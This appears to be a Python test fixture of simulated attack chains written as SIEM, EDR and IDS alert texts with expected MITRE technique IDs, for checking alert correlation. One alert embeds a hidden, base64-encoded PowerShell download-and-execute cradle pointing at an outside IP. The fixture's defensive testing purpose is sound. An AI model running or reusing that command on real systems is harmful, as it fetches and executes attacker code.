from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class ChainStep:
    name: str
    raw_text: str
    source_hint: str
    expected_technique: str
    delay_seconds: int = 0


@dataclass
class AttackChain:
    name: str
    description: str
    steps: list[ChainStep] = field(default_factory=list)
    expect_correlated: bool = True


# Shared attacker IP across the credential assault chain.
_ATTACKER_IP = "198.51.100.77"
_SHARED_HOST = "ws-fin-07"

CREDENTIAL_ASSAULT = AttackChain(
    name="credential_assault",
    description="T1110 brute force → T1078 valid-account login → T1041 exfil spike; same attacker IP; expect correlation",
    expect_correlated=True,
    steps=[
        ChainStep(
            name="brute_force",
            raw_text=(
                f"SIEM alert: 5,847 failed SSH login attempts from {_ATTACKER_IP} in the "
                f"last 10 minutes targeting bastion-01. Usernames attempted: root, admin, "
                f"test, svc-account, ubuntu. Brute force indicator."
            ),
            source_hint="siem",
            expected_technique="T1110",
            delay_seconds=1,
        ),
        ChainStep(
            name="valid_account_login",
            raw_text=(
                f"SIEM alert: Successful SSH login from {_ATTACKER_IP} to bastion-01 "
                f"as user svc-account. Login from unusual ASN (AS15169). "
                f"First login from this IP in 30 days."
            ),
            source_hint="siem",
            expected_technique="T1078",
            delay_seconds=1,
        ),
        ChainStep(
            name="exfil_spike",
            raw_text=(
                f"Network anomaly alert: source host bastion-01 egressing 1.2 GB to "
                f"external IP 198.51.100.7 over port 443 in last 5 min. Baseline egress "
                f"for that host is ~12 MB/day. Suspected data exfiltration. "
                f"Source IP: {_ATTACKER_IP}"
            ),
            source_hint="siem",
            expected_technique="T1041",
            delay_seconds=1,
        ),
    ],
)

RANSOMWARE_RUN = AttackChain(
    name="ransomware_run",
    description="T1566 phishing email → T1059 encoded powershell → T1486 mass rename; shared host; expect correlation",
    expect_correlated=True,
    steps=[
        ChainStep(
            name="phishing_email",
            raw_text=(
                f"Phishing alert: user j.doe@{_SHARED_HOST} reported suspicious email "
                f"from it-helpdesk@extarnal-bank.com with subject 'Urgent: Password Expiry Notice'. "
                f"Email contains link to http://45.142.120.99/reset. Targeted host: {_SHARED_HOST}"
            ),
            source_hint="email",
            expected_technique="T1566",
            delay_seconds=1,
        ),
        ChainStep(
            name="encoded_powershell",
            raw_text=(
                f"EDR (CrowdStrike) alert on host {_SHARED_HOST}: spawned powershell.exe by "
                f"user j.doe with command line: "
                f"'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQAzADIALgAxADIA' — "
                f"Living-off-the-Land indicator."
            ),
            source_hint="edr",
            expected_technique="T1059",
            delay_seconds=1,
        ),
        ChainStep(
            name="mass_rename",
            raw_text=(
                f"EDR alert: rapid mass file-extension rename (.locked) on host {_SHARED_HOST} "
                f"over last 3 min. 1,847 files affected. Ransomware behaviour detected. "
                f"Affected users: j.doe, admin."
            ),
            source_hint="edr",
            expected_technique="T1486",
            delay_seconds=1,
        ),
    ],
)

RECON_PROBE = AttackChain(
    name="recon_probe",
    description="Single T1595-ish scanning alert; no correlation expected",
    expect_correlated=False,
    steps=[
        ChainStep(
            name="port_scan",
            raw_text=(
                "IDS alert: port scan detected from 45.142.120.99 targeting external subnet "
                "203.0.113.0/24. 1,024 ports scanned in 30s. No successful connections established. "
                "Likely reconnaissance / sweeping."
            ),
            source_hint="ids",
            expected_technique="T1595",
            delay_seconds=0,
        ),
    ],
)

ALL_CHAINS = [CREDENTIAL_ASSAULT, RANSOMWARE_RUN, RECON_PROBE]
